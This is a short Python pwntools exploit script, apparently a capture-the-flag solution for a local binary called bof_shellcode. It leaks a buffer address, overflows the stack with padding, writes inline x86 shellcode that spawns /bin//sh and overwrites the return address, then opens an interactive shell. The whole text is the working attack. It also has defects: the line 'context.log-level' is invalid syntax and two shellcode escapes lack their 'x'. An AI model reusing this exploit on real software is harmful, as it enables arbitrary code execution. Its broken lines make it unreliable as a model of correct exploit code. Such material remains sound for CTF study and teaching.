from pwn import *

context.log-level = "debug"
p = process('./bof_shellcode')
p.recvuntil('buf[8][4]=(')
buf_addr = int(p.recv(10),16)
payload = b"a" * 68
payload = payload + b"\x31\xc0\50\x68\x6e\x2f\x73\68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80" #scanf
payload = payload + b"a" * 38
payload = payload + p32(buf_addr)
p.sendline(payload)
p.interactive()
